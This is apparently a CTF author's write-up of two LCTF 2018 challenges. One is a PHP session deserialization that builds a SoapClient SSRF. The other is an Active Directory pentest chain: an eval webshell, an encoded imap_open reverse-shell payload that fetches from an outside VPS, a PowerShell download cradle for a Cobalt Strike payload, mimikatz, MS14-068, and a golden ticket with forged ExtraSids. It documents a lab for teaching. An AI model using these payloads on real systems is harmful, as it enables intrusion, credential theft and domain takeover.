### babyphp's revenge
代码如下
index.php
```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
?>
```
flag.php
```php
session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){ $_SESSION['flag'] = $flag; } 
```
hint:反序列化
这题是我出给XCTF Final的bestphp的第二版，搭建看到flag.php的内容也能猜出来是ssrf。大体思路也是session_start支持一个数组参数，可以覆盖php.ini中的部分session相关变量，而session中有个叫做serialize_handler的参数
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/9F6A76C83EA36A7B5E2B37D26D951FF2.jpg)
可以控制session的解析引擎，所以可以借用由解析引擎的不同导致的session反序列化，构造soap类ssrf，获取flag
但是这里有个问题就是如何进行ssrf构造，众所周知soap的ssrf需要调用_call方法，但是这里如何触发呢，我们回到call_user_func
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-19_14-59-44.png)
这里可以发现我们可以直接使用call_user_func执行对象中的方法，由于我们只需要构造出一个soap类的对象就可以执行`welcome_to_the_lctf2018`的方法，因为这个方法不存在，所以我们相当于调用了_call方法
```php
$target='http://127.0.0.1/flag.php';
$b = new SoapClient(null,array('location' => $target,
                               'user_agent' => "AAA:BBB\r\n" .
                                             "Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912",
                               'uri' => "http://127.0.0.1/"));

$se = serialize($b); 
echo urlencode($se);
```


里主要思路是通过php session引擎的不同，导致自动反序列化soap内置类，最终ssrf读到flag

![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/121C2F45BD0C6C978579565B052B32C4.jpg)
!()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/3FFB2A23BA3AF86034D45C718554A964.jpg)

# god of domain-pentest writeup
前排先感谢各位师傅的手下留情，让我们的运维压力少了不少压力。
整个域环境其实挺难搭的，尤其是搭在腾讯云上，由于腾讯云只支持windowsserver虚拟机，以及本地管理员用户登录，导致我无法在172.21.0.8上登录域用户，所以大家也无法抓到域用户的密码，所以只好把域用户写到题目描述中了。
### 拓扑
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-19_00-57-40.png)

### 入口

首先代码如下
```php
 <?php
highlight_file(__FILE__);
$lshell=$_GET['lshell'];
eval($lshell);
var_dump($lshell);
NULL 
```
#### 解法一 
入口很简洁，一上来就给了你一个一句话木马，但是看一下phpinfo会发现我限制了严格的disable_function和open_basedir
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-08-33.png)
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-08-33.png)
这里首先我们最终目的是bypass open_basedir，查看任意目录的文件，但是常用的方法我都禁止了，所以解决问题还得回到bypass disable_function,这里丢一个最新的bypass方式
```
https://github.com/Bo0oM/PHP_imap_open_exploit
```
可以通过这个payload反弹shell
```
%24server%20%3D%20%22x%20-oProxyCommand%3Decho%5CtY3VybCB2cHMucHVwaWxlcy5jb218cHl0aG9u%7Cbase64%5Ct-d%7Csh%7D%22%3B%0Aimap_open(%27%7B%27.%24server.%27%3A143%2Fimap%7DINBOX%27%2C%20%27%27%2C%20%27%27)%20or%20die(%22%5Cn%5CnError%3A%20%22.imap_last_error())%3B
```
/var/www/ew.txt
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-22-52.png)
这里提供了10个socks5 端口代理，供各位师傅代理进内网，
#### 解法二
nmap直接扫，发现1080-1090端口开放是代理端口，直接链接
#### 解法三
ROIS的师傅构造了一个一句话版的regork，膜
地址[https://github.com/zsxsoft/reGeorg](https://github.com/zsxsoft/reGeorg)
### 子域-PC
这里有两种方式可以getshell
1. proxychains4 代理一下nmap扫内网，发现172.21.0.8开放了80端口，访问一看是个内网的phpstudy，那就可以用默认密码root，root登录phpmyadmin，修改general log为ON，general log file为C:\phpStudy/PHPTutorial/WWW/xxxx.php
可以getshell
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-40-14.png)
2. ms17-010直接打


getshell后打开cmd使用cobaltstrike的payload
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-53-37.png)
!()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-52-09.png]
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://139.199.27.197:8000/aaa'))"
```
在shell上执行，可以得到回弹的shell
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-54-56.png)
查看下权限是本地管理员权限，那么可以直接用mimikatz抓取密码
!()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_17-55-47.png]
根据题目描述，域用户为web.lctf.com\buguake,密码为xdsec@lctf2018
### 子域-域控
通过
```
ipconfig /all
```
可以得到子域域控的ip地址
```
172.21.0.7
```
收集域控信息
```
nltest /dsgetdc:web.lctf.com
```
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_18-14-28.png)
可以得到域控的hostname
一切准备妥当后，我们可以尝试一下ms14-068拿子域域控
```
python goldenPac.py -dc-ip 172.21.0.7 -target-ip 172.21.0.7 web.lctf.com/buguake:'xdsec@lctf2018'@sub-dc
```
getshell
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_18-20-31.png)
### 父域-域控
老规矩通过
```
ipconfig /all
```
可以得到父域域控的ip地址
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_18-21-33.png)
```
172.17.0.10
```
收集父域域控的信息
```
nltest /dsgetdc:lctf.com
```
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_18-22-21.png)
这里是本题重要的一个考点，修复了14-068，想拿父域域控需要设计到跨域渗透的问题。所以我们可以利用域信任关系的漏洞进行攻击
参考资料[http://www.4hou.com/technology/10049.html](http://www.4hou.com/technology/10049.html)
如文中提到
```
由于信任在Active Directory林中工作原理的原因，sidHistory属性（PAC中的“ExtraSids”）在林的域内比较重要，因为这些SID在“SID筛选”保护的跨域引用中未被滤除掉。因此，将其sidHistory 或 ExtraSids设置为“Enterprise Admins”SID（仅存在于林根中的域用户组）的子域中的任何用户将有效地工作，就好像他们是企业管理员一样。正如微软已经知道这是一个问题，而且至少从 2005年的ITPro Windows文章以及几乎可以肯定之前的知识已经完全公开，sidHistory 是一个非常难以修改的受保护的属性。
```
我们可以通过设置一个用户的sidHistory 或 ExtraSids为“Enterprise Admins”SID，也就是企业管理员组的SID(企业管理员组由每个域的域管组成),这样当我们尝试访问一个新的资源时，如果SID或SID历史记录匹配，则根据ACL中指定的访问权限授予我们访问权限。
那么我们应该如何伪造这个sid history呢，这里我们就用到了黄金票据（一种有效的TGT Kerberos票据，因为它是由域Kerberos帐户（KRBTGT）加密和签名的）的原理，只要我们能获得域账户krbtgt的hash值，便可以对其任意域用户的sid history进行操控。
参考链接:[https://www.cnblogs.com/backlion/p/8127868.html](https://www.cnblogs.com/backlion/p/8127868.html)
获取子域和父域的sid
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-18_18-28-15.png)
获取子域控krbtgt的密码hash值
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/46D2D12CCECD550E30F656A20E24AA91.png)
```
kerberos::golden /admin:administrator /domain:web.lctf.com /sid:S-1-5-21-508737280-3758319117-1445457868 /sids:S-1-5-21-35370905-2178818314-1839806818-519 /krbtgt:42cb5299c2e40ad7d04cb2d7d16f3a46 /startoffset:0 /endin:600 /renewmax:10000 /ptt
```
查看票证是否注入成功
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/D89E0D7EB2290FA511118DF6D774FE18.png)

flag就在父域域控的桌面上
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/8A4D695EA9F3BD06D351F19458B8246B.png)
